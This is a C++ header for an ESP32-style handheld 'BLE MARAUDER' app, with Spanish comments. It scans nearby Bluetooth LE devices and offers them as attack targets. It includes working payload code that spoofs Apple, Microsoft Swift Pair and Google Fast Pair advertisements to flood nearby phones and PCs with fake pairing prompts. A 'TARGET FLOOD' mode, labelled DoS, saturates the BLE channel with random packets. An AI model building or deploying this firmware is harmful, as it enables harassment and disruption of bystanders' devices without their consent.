#ifndef APPSPAMBLE_H
#define APPSPAMBLE_H
#include "App.h"
#include "Emojis.h"
#include "ui/Launcher.h"
#include "config.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

#define LED_PIN 48

// Variables globales para el escáner
static int dispositivosBLE = 0;
static String nombresBLE[15];
static String macsBLE[15];
static int rssiBLE[15];

// Callback para capturar dispositivos sin bloquear el sistema
class IronBLECallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
        if (dispositivosBLE < 15) {
            nombresBLE[dispositivosBLE] = advertisedDevice.haveName() ? advertisedDevice.getName().c_str() : "Desconocido";
            macsBLE[dispositivosBLE] = advertisedDevice.getAddress().toString().c_str();
            rssiBLE[dispositivosBLE] = advertisedDevice.getRSSI();
            dispositivosBLE++;
        }
    }
};

// Instancia global para evitar fugas de memoria
static IronBLECallbacks ironBLECb;

class AppSpamBLE : public App {
private:
    enum EstadoBLE { MENU_RAIZ, SCAN_BLE, LISTA_BLE, ATACANDO_TARGET, SPAM_APPLE, SPAM_WINDOWS, SPAM_ANDROID };
    EstadoBLE estadoActual = MENU_RAIZ;

    int indiceMenu = 0;
    String opcionesMenu[4] = {"1. RADAR & TARGET", "2. SOUR APPLE", "3. SWIFT PAIR", "4. FAST PAIR"};

    int indiceSeleccionado = 0;
    String macObjetivo = "";
    String nombreObjetivo = "";

    unsigned long ultimoMovimiento = 0;
    unsigned long ultimoParpadeo = 0;
    unsigned long ultimoSpamRefresh = 0;
    
    int anguloNeon = 0;
    unsigned long ultimoFrameNeon = 0;
    unsigned long inicioEscaneo = 0;
    int segundosRestantes = 4;
    
    bool pantallaActualizada = false;
    bool btnAnterior = false;
    bool estadoLed = false;
    
    // --- BANDERAS ANTI-CRASH (Solución al error del Log) ---
    bool bleIniciado = false;
    bool isScanning = false;
    bool isAdvertising = false;

    BLEScan* pBLEScan;
    BLEAdvertising* pAdvertising;
    int tipoDispositivoFalso = 0;
    long paquetesEnviados = 0;

    void detenerTodoBLESeguro() {
        if (isScanning && pBLEScan) {
            pBLEScan->stop();
            isScanning = false;
        }
        if (isAdvertising && pAdvertising) {
            pAdvertising->stop();
            isAdvertising = false;
        }
    }

    void inyectarPayload(EstadoBLE tipoAtaque, int variacion) {
        BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
        oAdvertisementData.setFlags(0x1A);
        std::string payload = "";

        if (tipoAtaque == SPAM_APPLE) {
            payload += (char)0xFF; payload += (char)0x4C; payload += (char)0x00; 
            payload += (char)0x07; payload += (char)0x19; 
            if (variacion == 0)      { payload += (char)0x01; payload += (char)0x02; payload += (char)0x20; } 
            else if (variacion == 1) { payload += (char)0x09; payload += (char)0x0A; payload += (char)0x13; } 
            else                     { payload += (char)0x0B; payload += (char)0x0C; payload += (char)0x0E; } 
            for(int i=0; i<18; i++) payload += (char)random(0, 255);
        } 
        else if (tipoAtaque == SPAM_WINDOWS) {
            payload += (char)0xFF; payload += (char)0x06; payload += (char)0x00; 
            payload += (char)0x03; payload += (char)0x00; payload += (char)0x80;
            for(int i=0; i<20; i++) payload += (char)random(0, 255);
        }
        else if (tipoAtaque == SPAM_ANDROID) {
            payload += (char)0x16; payload += (char)0x2C; payload += (char)0xFE;
            payload += (char)0x00; payload += (char)random(0,255); payload += (char)random(0,255);
            for(int i=0; i<18; i++) payload += (char)random(0, 255);
        }

        oAdvertisementData.addData(payload);
        pAdvertising->setAdvertisementData(oAdvertisementData);
        paquetesEnviados++;
    }

public:
    const char* obtenerNombre() override { return "BLE MARAUDER"; }
    const uint8_t* obtenerEmoji() override { return emoji_blespam; } 
    
    void setup() override {}

    void alEntrar() override {
        estadoActual = MENU_RAIZ;
        indiceMenu = 0;
        anguloNeon = 0;
        ultimoFrameNeon = millis();
        ultimoMovimiento = millis();
        pantallaActualizada = false;
        btnAnterior = (digitalRead(JOY_SW) == LOW);
        neopixelWrite(LED_PIN, 0, 0, 0); 
        
        if (!bleIniciado) {
            BLEDevice::init("IronOS");
            
            pBLEScan = BLEDevice::getScan();
            pBLEScan->setAdvertisedDeviceCallbacks(&ironBLECb, true);
            pBLEScan->setActiveScan(true);
            pBLEScan->setInterval(100);
            pBLEScan->setWindow(99); 
            
            pAdvertising = BLEDevice::getAdvertising();
            pAdvertising->setScanResponse(false);
            pAdvertising->setMinPreferred(0x06);
            pAdvertising->setMinInterval(0x20);
            pAdvertising->setMaxInterval(0x20);
            
            bleIniciado = true;
            isScanning = false;
            isAdvertising = false;
        }
    }
    
    void alSalir() override {
        if (bleIniciado) {
            detenerTodoBLESeguro();
            BLEDevice::deinit(true);
            bleIniciado = false;
        }
        neopixelWrite(LED_PIN, 0, 0, 0);
    }

    void loop(Arduino_Canvas* canvas) override {
        
        int valVert = joyEjeY_esVertical ? analogRead(JOY_Y) : analogRead(JOY_X);
        int valHoriz = joyEjeY_esVertical ? analogRead(JOY_X) : analogRead(JOY_Y);

        bool arriba = joyInvVertical ? (valVert > 3200) : (valVert < 800);
        bool abajo = joyInvVertical ? (valVert < 800) : (valVert > 3200);
        bool izq = joyInvHorizontal ? (valHoriz > 3200) : (valHoriz < 800);
        bool der = joyInvHorizontal ? (valHoriz < 800) : (valHoriz > 3200);

        bool botonAhora = (digitalRead(JOY_SW) == LOW);
        bool clicSimple = (botonAhora && !btnAnterior);

        if (millis() - ultimoFrameNeon > 30) {
            anguloNeon = (anguloNeon + 8) % 360; 
            ultimoFrameNeon = millis();
            pantallaActualizada = false; 
        }

        // ==========================================
        // ESTADO 0: MENU PRINCIPAL
        // ==========================================
        if (estadoActual == MENU_RAIZ) {
            if (millis() - ultimoMovimiento > 200) {
                if (arriba) { indiceMenu--; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (abajo)  { indiceMenu++; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (indiceMenu < 0) indiceMenu = 3;
                if (indiceMenu > 3) indiceMenu = 0;
            }

            if (clicSimple) {
                if (indiceMenu == 0) { 
                    estadoActual = SCAN_BLE; 
                    inicioEscaneo = millis();
                    segundosRestantes = 4;
                    
                    // Detener Advertising si estaba encendido
                    if (isAdvertising) { pAdvertising->stop(); isAdvertising = false; }
                    
                    dispositivosBLE = 0;
                    pBLEScan->clearResults();
                    pBLEScan->start(0, nullptr, false); 
                    isScanning = true; // <-- Marcamos escáner como activo
                }
                else {
                    if (indiceMenu == 1) estadoActual = SPAM_APPLE; 
                    else if (indiceMenu == 2) estadoActual = SPAM_WINDOWS; 
                    else if (indiceMenu == 3) estadoActual = SPAM_ANDROID; 
                    
                    // Detener Escáner SOLO si estaba encendido (Adiós Error de Log)
                    if (isScanning) { pBLEScan->stop(); isScanning = false; }
                    
                    pAdvertising->start();
                    isAdvertising = true; // <-- Marcamos ataque como activo
                    paquetesEnviados = 0; 
                }
                pantallaActualizada = false;
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_CYAN);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_BLUE); 
                
                Launcher::dibujarTextoCentrado(canvas, "ARSENAL BLUETOOTH", 35, 1, IRON_CYAN);
                canvas->drawLine(20, 45, 220, 45, IRON_DARK);

                for (int i = 0; i < 4; i++) {
                    int yPos = 65 + (i * 32);
                    
                    if (i == indiceMenu) {
                        canvas->fillRoundRect(15, yPos - 12, 210, 24, 3, IRON_RED);
                        canvas->fillTriangle(20, yPos-4, 20, yPos+4, 25, yPos, WHITE);
                        Launcher::dibujarTextoCentrado(canvas, opcionesMenu[i].c_str(), yPos - 3, 1, WHITE);
                    } else {
                        Launcher::dibujarTextoCentrado(canvas, opcionesMenu[i].c_str(), yPos - 3, 1, IRON_BLUE);
                    }
                }

                // Instrucción de salida
                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setTextSize(1);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("DOBLE CLICK");
                
                canvas->flush();
                pantallaActualizada = true;
            }
        } 
        // ==========================================
        // ESTADO 1: ESCANEANDO AIRE
        // ==========================================
        else if (estadoActual == SCAN_BLE) {
            if (millis() - ultimoParpadeo > 200) {
                ultimoParpadeo = millis();
                estadoLed = !estadoLed;
                if (estadoLed) neopixelWrite(LED_PIN, 0, 255, 0); 
                else neopixelWrite(LED_PIN, 0, 0, 0);
            }

            int transcurrido = (millis() - inicioEscaneo) / 1000;
            int nuevoRestante = 4 - transcurrido;
            if (nuevoRestante < 0) nuevoRestante = 0;
            if (nuevoRestante != segundosRestantes) segundosRestantes = nuevoRestante;

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_GREEN);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_DARK); 
                canvas->drawArc(120, 120, 117, 113, (anguloNeon + 20) % 360, (anguloNeon + 50) % 360, IRON_GREEN); 

                Launcher::dibujarTextoCentrado(canvas, "BLE RADAR SCAN", 100, 2, IRON_GREEN);
                
                char tiempoStr[32];
                sprintf(tiempoStr, "Termina en: %d s", segundosRestantes);
                Launcher::dibujarTextoCentrado(canvas, tiempoStr, 130, 1, WHITE);
                
                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setTextSize(1);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("DOBLE CLICK");
                
                canvas->flush();
                pantallaActualizada = true;
            }

            if (segundosRestantes == 0) {
                detenerTodoBLESeguro();
                estadoActual = LISTA_BLE;
                neopixelWrite(LED_PIN, 0, 0, 0); 
                pantallaActualizada = false;
            }
        }
        // ==========================================
        // ESTADO 2: LISTA DE OBJETIVOS BLE
        // ==========================================
        else if (estadoActual == LISTA_BLE) {
            if (millis() - ultimoMovimiento > 250) {
                if (arriba) { indiceSeleccionado--; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (abajo) { indiceSeleccionado++; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (izq) { estadoActual = MENU_RAIZ; detenerTodoBLESeguro(); pantallaActualizada = false; ultimoMovimiento = millis(); }

                if (indiceSeleccionado < 0) indiceSeleccionado = (dispositivosBLE > 0) ? dispositivosBLE - 1 : 0;
                if (indiceSeleccionado >= dispositivosBLE) indiceSeleccionado = 0;

                if ((clicSimple || der) && dispositivosBLE > 0) {
                    macObjetivo = macsBLE[indiceSeleccionado];
                    nombreObjetivo = nombresBLE[indiceSeleccionado];
                    estadoActual = ATACANDO_TARGET;
                    
                    pAdvertising->start(); 
                    isAdvertising = true;
                    
                    pantallaActualizada = false;
                    ultimoMovimiento = millis();
                }
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_CYAN);
                
                char titulo[32];
                sprintf(titulo, "DISPOSITIVOS (%d)", dispositivosBLE);
                Launcher::dibujarTextoCentrado(canvas, titulo, 30, 1, IRON_CYAN);
                canvas->drawLine(20, 40, 220, 40, IRON_DARK);

                if (dispositivosBLE == 0) {
                    Launcher::dibujarTextoCentrado(canvas, "NO HAY REDES", 110, 2, IRON_BLUE);
                } else {
                    int inicio = indiceSeleccionado - 1;
                    if (inicio < 0) inicio = 0;
                    if (dispositivosBLE > 3 && inicio > dispositivosBLE - 3) inicio = dispositivosBLE - 3;

                    for (int i = 0; i < 3 && (inicio + i) < dispositivosBLE; i++) {
                        int idx = inicio + i;
                        int yPos = 65 + (i * 35);

                        canvas->setTextSize(1);
                        canvas->setCursor(25, yPos);
                        
                        String nom = nombresBLE[idx];
                        if(nom.length() > 10) nom = nom.substring(0, 10);
                        
                        if (idx == indiceSeleccionado) {
                            canvas->fillRoundRect(10, yPos - 10, 220, 25, 3, IRON_RED);
                            canvas->fillTriangle(15, yPos-2, 15, yPos+6, 20, yPos+2, WHITE);
                            canvas->setTextColor(WHITE);
                        } else {
                            canvas->setTextColor(IRON_BLUE);
                        }

                        canvas->print(String(idx + 1) + ". " + nom + " [" + String(rssiBLE[idx]) + "]");
                    }
                    Launcher::dibujarTextoCentrado(canvas, "Clic/Der = ATACAR", 170, 1, IRON_RED);
                    Launcher::dibujarTextoCentrado(canvas, "< Volver = Izq", 185, 1, IRON_DARK);
                }
                
                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setTextSize(1);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("DOBLE CLICK");
                
                canvas->flush();
                pantallaActualizada = true;
            }
        }
        // ==========================================
        // ESTADO 3: ATAQUE DIRIGIDO A MAC (DOS)
        // ==========================================
        else if (estadoActual == ATACANDO_TARGET) {
            if (millis() - ultimoParpadeo > 80) {
                ultimoParpadeo = millis();
                estadoLed = !estadoLed;
                if (estadoLed) neopixelWrite(LED_PIN, 255, 0, 0);
                else neopixelWrite(LED_PIN, 0, 0, 0);
            }

            if (millis() - ultimoSpamRefresh > 50) {
                ultimoSpamRefresh = millis();
                BLEAdvertisementData oData = BLEAdvertisementData();
                oData.setFlags(0x1A);
                std::string payload = "";
                payload += (char)0xFF; 
                payload += (char)0xFF; payload += (char)0xFF; 
                for(int i=0; i<20; i++) payload += (char)random(0, 255);
                oData.addData(payload);
                pAdvertising->setAdvertisementData(oData);
            }

            if (millis() - ultimoMovimiento > 250) {
                if (izq || clicSimple) {
                    detenerTodoBLESeguro();
                    estadoActual = MENU_RAIZ;
                    neopixelWrite(LED_PIN, 0, 0, 0); 
                    pantallaActualizada = false;
                    ultimoMovimiento = millis();
                }
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_RED);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_DARK); 

                Launcher::dibujarTextoCentrado(canvas, "TARGET FLOOD", 35, 1, IRON_RED);
                canvas->drawLine(30, 45, 210, 45, IRON_DARK);

                Launcher::dibujarTextoCentrado(canvas, nombreObjetivo.substring(0, 18).c_str(), 75, 2, WHITE);
                Launcher::dibujarTextoCentrado(canvas, macObjetivo.c_str(), 105, 1, IRON_BLUE);

                Launcher::dibujarTextoCentrado(canvas, "Saturando canal BLE...", 150, 1, IRON_RED);
                Launcher::dibujarTextoCentrado(canvas, "< Volver = Izq", 175, 1, IRON_DARK);

                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setTextSize(1);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("DOBLE CLICK");

                canvas->flush();
                pantallaActualizada = true;
            }
        }
        // ==========================================
        // ESTADO 4: SPAM DE DISPOSITIVOS (BROADCAST)
        // ==========================================
        else if (estadoActual == SPAM_APPLE || estadoActual == SPAM_WINDOWS || estadoActual == SPAM_ANDROID) {
            
            if (millis() - ultimoParpadeo > 80) {
                ultimoParpadeo = millis();
                estadoLed = !estadoLed;
                if (estadoLed) neopixelWrite(LED_PIN, 255, 0, 255); 
                else neopixelWrite(LED_PIN, 0, 0, 0);
            }

            if (millis() - ultimoSpamRefresh > 100) { 
                ultimoSpamRefresh = millis();
                inyectarPayload(estadoActual, tipoDispositivoFalso);
                tipoDispositivoFalso = (tipoDispositivoFalso + 1) % 3;
            }

            if (millis() - ultimoMovimiento > 250) {
                if (izq || clicSimple) {
                    detenerTodoBLESeguro();
                    estadoActual = MENU_RAIZ;
                    neopixelWrite(LED_PIN, 0, 0, 0); 
                    pantallaActualizada = false;
                    ultimoMovimiento = millis();
                }
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_RED);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, WHITE); 

                String titulo = "";
                if(estadoActual == SPAM_APPLE) titulo = "SOUR APPLE";
                else if(estadoActual == SPAM_WINDOWS) titulo = "SWIFT PAIR";
                else if(estadoActual == SPAM_ANDROID) titulo = "FAST PAIR";

                Launcher::dibujarTextoCentrado(canvas, titulo.c_str(), 40, 2, IRON_GREEN);
                canvas->drawLine(20, 60, 220, 60, IRON_DARK);

                Launcher::dibujarTextoCentrado(canvas, "INYECTANDO PAQUETES", 100, 1, WHITE);
                
                char chStr[32];
                sprintf(chStr, "Paquetes: %ld", paquetesEnviados);
                Launcher::dibujarTextoCentrado(canvas, chStr, 130, 1, IRON_GREEN);

                Launcher::dibujarTextoCentrado(canvas, "< Detener = Clic/Izq", 170, 1, IRON_DARK);

                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("DOBLE CLICK");

                canvas->flush();
                pantallaActualizada = true;
            }
        }

        btnAnterior = botonAhora;
        delay(10);
    }
};
#endif